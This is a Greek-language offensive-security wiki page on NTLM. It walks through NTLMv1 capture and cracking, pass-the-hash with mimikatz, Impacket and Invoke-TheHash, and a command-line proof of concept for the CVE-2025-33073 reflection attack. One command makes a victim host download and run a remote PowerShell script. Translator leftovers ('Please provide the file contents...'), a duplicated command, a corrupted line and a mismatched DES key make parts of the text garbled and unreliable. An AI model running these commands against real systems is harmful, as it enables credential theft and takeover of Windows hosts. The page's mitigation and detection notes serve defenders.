# NTLM

{{#include ../../banners/hacktricks-training.md}}


## Βασικές πληροφορίες

Σε περιβάλλοντα όπου χρησιμοποιούνται τα **Windows XP και Server 2003**, αξιοποιούνται hashes LM (Lan Manager), αν και είναι ευρέως γνωστό ότι μπορούν να παραβιαστούν εύκολα. Ένα συγκεκριμένο LM hash, `AAD3B435B51404EEAAD3B435B51404EE`, υποδεικνύει ότι το LM δεν χρησιμοποιείται και αντιπροσωπεύει το hash μιας κενής συμβολοσειράς.

Από προεπιλογή, το πρωτόκολλο authentication **Kerberos** είναι η κύρια μέθοδος που χρησιμοποιείται. Το NTLM (NT LAN Manager) ενεργοποιείται υπό συγκεκριμένες συνθήκες: απουσία του Active Directory, ανυπαρξία του domain, δυσλειτουργία του Kerberos λόγω εσφαλμένης ρύθμισης ή όταν επιχειρούνται συνδέσεις χρησιμοποιώντας μια IP address αντί για έγκυρο hostname.

Η παρουσία της κεφαλίδας **"NTLMSSP"** στα network packets υποδεικνύει μια διαδικασία authentication NTLM.

Η υποστήριξη των πρωτοκόλλων authentication - LM, NTLMv1 και NTLMv2 - παρέχεται από ένα συγκεκριμένο DLL που βρίσκεται στο `%windir%\Windows\System32\msv1\_0.dll`.

**Βασικά σημεία**:

- Τα LM hashes είναι ευάλωτα και ένα κενό LM hash (`AAD3B435B51404EEAAD3B435B51404EE`) υποδηλώνει ότι δεν χρησιμοποιείται.
- Το Kerberos είναι η προεπιλεγμένη μέθοδος authentication, ενώ το NTLM χρησιμοποιείται μόνο υπό συγκεκριμένες συνθήκες.
- Τα NTLM authentication packets αναγνωρίζονται από την κεφαλίδα "NTLMSSP".
- Τα πρωτόκολλα LM, NTLMv1 και NTLMv2 υποστηρίζονται από το system file `msv1\_0.dll`.

## LM, NTLMv1 και NTLMv2

Μπορείτε να ελέγξετε και να ρυθμίσετε ποιο πρωτόκολλο θα χρησιμοποιείται:

### GUI

Εκτελέστε το _secpol.msc_ -> Local policies -> Security Options -> Network Security: LAN Manager authentication level. Υπάρχουν 6 επίπεδα (από 0 έως 5).

![LM, NTLMv1 και NTLMv2 - GUI: Εκτέλεση του secpol.msc - Local policies - Security Options - Network Security: LAN Manager authentication level. Υπάρχουν 6 επίπεδα (από 0 έως 5)](<../../images/image (919).png>)

### Registry

Αυτό θα ορίσει το επίπεδο 5:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
Πιθανές τιμές:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Βασικό NTLM Domain authentication Scheme

1. Ο **user** εισάγει τα **credentials** του
2. Το client machine **στέλνει ένα authentication request**, στέλνοντας το **domain name** και το **username**
3. Ο server στέλνει το **challenge**
4. Ο **client κάνει encrypt** το **challenge**, χρησιμοποιώντας ως key το hash του password, και το στέλνει ως response
5. Ο **server στέλνει** στον **Domain controller** το **domain name, το username, το challenge και το response**. Αν **δεν** υπάρχει ρυθμισμένο Active Directory ή το domain name είναι το όνομα του server, τα credentials **ελέγχονται τοπικά**.
6. Ο **domain controller ελέγχει αν όλα είναι σωστά** και στέλνει τις πληροφορίες στον server

Ο **server** και ο **Domain Controller** μπορούν να δημιουργήσουν ένα **Secure Channel** μέσω του **Netlogon** server, καθώς ο Domain Controller γνωρίζει το password του server (βρίσκεται μέσα στη βάση **NTDS.DIT**).

### Local NTLM authentication Scheme

Το authentication γίνεται όπως αναφέρθηκε **προηγουμένως, αλλά** ο **server** γνωρίζει το **hash του user** που προσπαθεί να κάνει authenticate μέσα στο αρχείο **SAM**. Έτσι, αντί να ρωτήσει τον Domain Controller, ο **server θα ελέγξει ο ίδιος** αν ο user μπορεί να κάνει authenticate.

### NTLMv1 Challenge

Το **μήκος του challenge είναι 8 bytes** και το **response έχει μήκος 24 bytes**.

Το **NT hash (16bytes)** χωρίζεται σε **3 τμήματα των 7bytes** (7B + 7B + (2B+0x00\*5)): το **τελευταίο τμήμα συμπληρώνεται με zeros**. Στη συνέχεια, το **challenge** γίνεται **ciphered ξεχωριστά** με κάθε τμήμα και τα **resulting** ciphered bytes **ενώνονται**. Σύνολο: 8B + 8B + 8B = 24Bytes.

**Προβλήματα**:

- Έλλειψη **randomness**
- Τα 3 τμήματα μπορούν να **δεχτούν επίθεση ξεχωριστά**, ώστε να βρεθεί το NT hash
- Το **DES μπορεί να γίνει crack**
- Το 3º key αποτελείται πάντα από **5 zeros**.
- Με δεδομένο το **ίδιο challenge**, το **response** θα είναι **το ίδιο**. Επομένως, μπορείς να δώσεις ως **challenge** στο victim το string "**1122334455667788**" και να κάνεις attack στο response χρησιμοποιώντας **precomputed rainbow tables**.

### NTLMv1 attack

Σήμερα γίνεται όλο και λιγότερο συνηθισμένο να βρίσκουμε environments με ρυθμισμένο Unconstrained Delegation, αλλά αυτό δεν σημαίνει ότι δεν μπορείς να **κάνεις abuse σε ένα Print Spooler service** που είναι ρυθμισμένο.

Θα μπορούσες να κάνεις abuse σε ορισμένα credentials/sessions που έχεις ήδη στο AD, ώστε να **ζητήσεις από τον printer να κάνει authenticate** σε κάποιο **host υπό τον έλεγχό σου**. Έπειτα, χρησιμοποιώντας `metasploit auxiliary/server/capture/smb` ή `responder`, μπορείς να **ορίσεις το authentication challenge σε 1122334455667788**, να καταγράψεις το authentication attempt και, αν έγινε με χρήση **NTLMv1**, θα μπορείς να **κάνεις crack σε αυτό**.\
Αν χρησιμοποιείς `responder`, μπορείς να δοκιμάσεις να **χρησιμοποιήσεις το flag `--lm`**, για να προσπαθήσεις να κάνεις **downgrade** το **authentication**.\
_Σημείωσε ότι για αυτή την τεχνική το authentication πρέπει να πραγματοποιηθεί με χρήση NTLMv1 (το NTLMv2 δεν είναι έγκυρο)._

Να θυμάσαι ότι ο printer θα χρησιμοποιήσει το computer account κατά το authentication και τα computer accounts χρησιμοποιούν **μεγάλα και τυχαία passwords**, τα οποία **πιθανότατα δεν θα μπορέσεις να κάνεις crack** χρησιμοποιώντας συνηθισμένα **dictionaries**. Ωστόσο, το **NTLMv1** authentication **χρησιμοποιεί DES** ([περισσότερες πληροφορίες εδώ](#ntlmv1-challenge)), οπότε με τη χρήση ορισμένων services ειδικά αφιερωμένων στο cracking του DES θα μπορέσεις να το κάνεις crack (για παράδειγμα, μπορείς να χρησιμοποιήσεις τα [https://crack.sh/](https://crack.sh) ή [https://ntlmv1.com/](https://ntlmv1.com)).

### NTLMv1 attack with hashcat

Το NTLMv1 μπορεί επίσης να γίνει broken με το NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi), το οποίο κάνει format τα NTLMv1 messages με μια μέθοδο που μπορεί να γίνει broken με το hashcat.<sup>[[1]](#references)</sup>

Η εντολή
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
θα παρήγαγε τα παρακάτω:
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
Please provide the file contents and filename.
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
Εκτελέστε το hashcat (η distributed εκτέλεση είναι προτιμότερη μέσω ενός εργαλείου όπως το hashtopolis), καθώς διαφορετικά θα χρειαστούν αρκετές ημέρες.
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
Σε αυτή την περίπτωση γνωρίζουμε ότι το password είναι password, οπότε θα κάνουμε cheat για λόγους επίδειξης:
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
Τώρα πρέπει να χρησιμοποιήσουμε τα hashcat-utilities για να μετατρέψουμε τα cracked des keys σε τμήματα του NTLM hash:
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
Παρακαλώ επικολλήστε το τελευταίο μέρος που θέλετε να μεταφράσω.
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
Παρακαλώ επικολλήστε τα κείμενα που θέλετε να συνδυάσω και να μεταφράσω.
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

**Το μήκος του challenge είναι 8 bytes** και **αποστέλλονται 2 responses**: Το ένα έχει μήκος **24 bytes** και το μήκος του **άλλου** είναι **μεταβλητό**.

**Το πρώτο response** δημιουργείται κρυπτογραφώντας με **HMAC_MD5** το **string** που αποτελείται από το **client και το domain**, χρησιμοποιώντας ως **key** το **hash MD4** του **NT hash**. Στη συνέχεια, το **result** χρησιμοποιείται ως **key** για την κρυπτογράφηση του **challenge** με **HMAC_MD5**. Σε αυτό προστίθεται ένα **client challenge των 8 bytes**. Σύνολο: 24 B.

**Το δεύτερο response** δημιουργείται χρησιμοποιώντας **διάφορες τιμές** (ένα νέο client challenge, ένα **timestamp** για την αποφυγή **replay attacks**...)

Αν έχετε ένα **pcap στο οποίο έχει καταγραφεί μια επιτυχημένη διαδικασία authentication**, μπορείτε να ακολουθήσετε αυτόν τον οδηγό για να βρείτε το domain, το username, το challenge και το response και να προσπαθήσετε να κάνετε crack το password: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)<sup>[[2]](#references)</sup>

## Pass-the-Hash

**Μόλις αποκτήσετε το hash του victim**, μπορείτε να το χρησιμοποιήσετε για να **τον impersonate**.\
Πρέπει να χρησιμοποιήσετε ένα **tool** που θα **εκτελέσει** το **NTLM authentication χρησιμοποιώντας** αυτό το **hash**, **ή** μπορείτε να δημιουργήσετε ένα νέο **sessionlogon** και να κάνετε **inject** αυτό το **hash** μέσα στο **LSASS**, ώστε κάθε φορά που **εκτελείται NTLM authentication**, να χρησιμοποιείται **αυτό το hash**. Αυτή είναι η επιλογή που χρησιμοποιεί το mimikatz.

**Παρακαλούμε να θυμάστε ότι μπορείτε να εκτελέσετε επιθέσεις Pass-the-Hash και χρησιμοποιώντας Computer accounts.**

### **Mimikatz**

**Πρέπει να εκτελεστεί ως administrator**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
Αυτό θα εκκινήσει μια διεργασία που θα ανήκει στους users που εκκίνησαν το mimikatz, αλλά εσωτερικά στο LSASS τα αποθηκευμένα credentials είναι αυτά που βρίσκονται στις παραμέτρους του mimikatz. Έπειτα, μπορείτε να αποκτήσετε πρόσβαση σε network resources σαν να ήσασταν αυτός ο user (παρόμοια με το trick `runas /netonly`, αλλά δεν χρειάζεται να γνωρίζετε το plain-text password).

### Pass-the-Hash from linux

Μπορείτε να αποκτήσετε code execution σε Windows machines χρησιμοποιώντας Pass-the-Hash από Linux.\
[**Access here to learn how to do it.**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)

### Impacket Windows compiled tools

Μπορείτε να κατεβάσετε[ impacket binaries for Windows here](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** (Σε αυτήν την περίπτωση πρέπει να καθορίσετε μια εντολή, καθώς τα cmd.exe και powershell.exe δεν είναι έγκυρα για την απόκτηση interactive shell)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- Υπάρχουν αρκετά ακόμη Impacket binaries...

### Invoke-TheHash

Μπορείτε να λάβετε τα powershell scripts από εδώ: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)<sup>[[3]](#references)</sup>

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

Αυτή η function είναι ένα **μείγμα όλων των υπόλοιπων**. Μπορείτε να περάσετε **πολλά hosts**, να **εξαιρέσετε** ορισμένα και να **επιλέξετε** την **option** που θέλετε να χρησιμοποιήσετε (_SMBExec, WMIExec, SMBClient, SMBEnum_). Αν επιλέξετε **οποιοδήποτε** από τα **SMBExec** και **WMIExec**, αλλά **δεν** δώσετε καμία παράμετρο _**Command**_, θα **ελέγξει** απλώς αν έχετε **επαρκή permissions**.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**Πρέπει να εκτελεστεί ως administrator**

Αυτό το tool κάνει το ίδιο πράγμα με το mimikatz (τροποποιεί τη μνήμη του LSASS).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Manual Windows remote execution with username and password


{{#ref}}
../lateral-movement/
{{#endref}}

## Εξαγωγή credentials από Windows Host

**Για περισσότερες πληροφορίες σχετικά με** [**το πώς να αποκτήσετε credentials από ένα Windows host, διαβάστε αυτήν τη σελίδα**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**.**

## Internal Monologue attack

Το Internal Monologue Attack είναι μια stealthy τεχνική εξαγωγής credentials που επιτρέπει σε έναν attacker να ανακτήσει NTLM hashes από το μηχάνημα ενός θύματος **χωρίς να αλληλεπιδρά άμεσα με τη διαδικασία LSASS**. Σε αντίθεση με το Mimikatz, το οποίο διαβάζει hashes απευθείας από τη μνήμη και συχνά μπλοκάρεται από endpoint security solutions ή το Credential Guard, αυτή η επίθεση αξιοποιεί **local calls προς το NTLM authentication package (MSV1_0) μέσω του Security Support Provider Interface (SSPI)**. Αρχικά, ο attacker **υποβαθμίζει τις NTLM ρυθμίσεις** (π.χ. LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic), ώστε να επιτρέπεται το NetNTLMv1. Στη συνέχεια, κάνει impersonate υπάρχοντα user tokens που αποκτήθηκαν από running processes και ενεργοποιεί τοπικά NTLM authentication, για να δημιουργήσει NetNTLMv1 responses χρησιμοποιώντας ένα γνωστό challenge.<sup>[[4]](#references)</sup>

Αφού συλλέξει αυτά τα NetNTLMv1 responses, ο attacker μπορεί να ανακτήσει γρήγορα τα αρχικά NTLM hashes χρησιμοποιώντας **precomputed rainbow tables**, επιτρέποντας περαιτέρω Pass-the-Hash attacks για lateral movement. Σημαντικά, το Internal Monologue Attack παραμένει stealthy επειδή δεν δημιουργεί network traffic, δεν κάνει inject code και δεν ενεργοποιεί άμεσα memory dumps, γεγονός που το καθιστά δυσκολότερο να εντοπιστεί από τους defenders σε σύγκριση με παραδοσιακές μεθόδους όπως το Mimikatz.

Αν το NetNTLMv1 δεν γίνεται αποδεκτό —εξαιτίας enforced security policies— ο attacker μπορεί να αποτύχει να ανακτήσει NetNTLMv1 response.

Για την αντιμετώπιση αυτής της περίπτωσης, το Internal Monologue tool ενημερώθηκε: αποκτά δυναμικά ένα server token χρησιμοποιώντας `AcceptSecurityContext()`, ώστε να μπορεί να **συλλέγει NetNTLMv2 responses** αν αποτύχει το NetNTLMv1. Παρότι το NetNTLMv2 είναι πολύ δυσκολότερο να γίνει crack, εξακολουθεί να ανοίγει τον δρόμο για relay attacks ή offline brute-force σε περιορισμένες περιπτώσεις.

Το PoC βρίσκεται στο **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)**.

## NTLM Relay και Responder

**Διαβάστε εδώ έναν πιο αναλυτικό οδηγό για το πώς να πραγματοποιήσετε αυτές τις επιθέσεις:**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Ανάλυση NTLM challenges από network capture

**Μπορείτε να χρησιμοποιήσετε το** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

## NTLM & Kerberos *Reflection* μέσω Serialized SPNs (CVE-2025-33073)

Τα Windows περιέχουν αρκετά mitigations που προσπαθούν να αποτρέψουν *reflection* attacks, όπου ένα NTLM (ή Kerberos) authentication που ξεκινά από ένα host γίνεται relay πίσω στον **ίδιο** host, ώστε να αποκτηθούν SYSTEM privileges.

Η Microsoft έσπασε τις περισσότερες public chains με τα MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) και μεταγενέστερα patches. Ωστόσο, το **CVE-2025-33073** δείχνει ότι οι προστασίες μπορούν ακόμα να παρακαμφθούν μέσω abuse του τρόπου με τον οποίο ο **SMB client περικόπτει τα Service Principal Names (SPNs)** που περιέχουν *marshalled* (serialized) target-info.<sup>[[5]](#references)[[6]](#references)</sup>

### TL;DR του bug
1. Ένας attacker καταχωρίζει ένα **DNS A-record** του οποίου το label κωδικοποιεί ένα marshalled SPN — π.χ.
`srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. Το θύμα εξαναγκάζεται να κάνει authentication σε αυτό το hostname (PetitPotam, DFSCoerce κ.λπ.).
3. Όταν ο SMB client περνά το target string `cifs/srv11UWhRCAAAAA…` στο `lsasrv!LsapCheckMarshalledTargetInfo`, η κλήση προς `CredUnmarshalTargetInfo` **αφαιρεί** το serialized blob, αφήνοντας **`cifs/srv1`**.
4. Το `msv1_0!SspIsTargetLocalhost` (ή το αντίστοιχο του Kerberos) θεωρεί πλέον ότι το target είναι *localhost*, επειδή το short host part αντιστοιχεί στο όνομα του computer (`SRV1`).
5. Κατά συνέπεια, ο server θέτει το `NTLMSSP_NEGOTIATE_LOCAL_CALL` και κάνει inject το **SYSTEM access-token του LSASS** στο context (για το Kerberos δημιουργείται subsession key με ένδειξη SYSTEM).
6. Το relaying αυτού του authentication με `ntlmrelayx.py` **ή** `krbrelayx.py` παρέχει πλήρη SYSTEM rights στον ίδιο host.<sup>[[5]](#references)</sup>

### Quick PoC
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
-a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
-d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```
### Patches & Mitigations
* Το KB patch για το **CVE-2025-33073** προσθέτει έναν έλεγχο στο `mrxsmb.sys::SmbCeCreateSrvCall`, ο οποίος αποκλείει οποιαδήποτε SMB σύνδεση της οποίας ο προορισμός περιέχει marshalled info (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).<sup>[[5]](#references)[[6]](#references)</sup>
* Επιβάλετε **SMB signing** για την αποτροπή reflection ακόμη και σε hosts χωρίς patch.
* Παρακολουθείτε DNS records που μοιάζουν με `*<base64>...*` και αποκλείστε coercion vectors (PetitPotam, DFSCoerce, AuthIP...).

### Ιδέες για Detection
* Network captures με `NTLMSSP_NEGOTIATE_LOCAL_CALL`, όπου η client IP ≠ server IP.
* Kerberos AP-REQ που περιέχει subsession key και client principal ίσο με το hostname.
* Windows Event 4624/4648 SYSTEM logons που ακολουθούνται άμεσα από remote SMB writes από το ίδιο host.<sup>[[5]](#references)</sup>

Για την **March 2026** local reflection variant που κάνει abuse των **SMB arbitrary ports** και του **TCP connection reuse** για να φτάσει στο `NT AUTHORITY\SYSTEM`, δείτε:

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Αναφορές
- [1] [evilmog/ntlmv1-multi – NTLMv1 Multitool](https://github.com/evilmog/ntlmv1-multi)
- [2] [Cracking an NTLMv2 Hash](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
- [3] [Kevin-Robertson/Invoke-TheHash – PowerShell Pass The Hash Utilities](https://github.com/Kevin-Robertson/Invoke-TheHash)
- [4] [Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS](https://github.com/eladshamir/Internal-Monologue)
- [5] [NTLM Reflection is Dead, Long Live NTLM Reflection!](https://www.synacktiv.com/en/publications/la-reflexion-ntlm-est-morte-vive-la-reflexion-ntlm-analyse-approfondie-de-la-cve-2025.html)
- [6] [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)

{{#include ../../banners/hacktricks-training.md}}
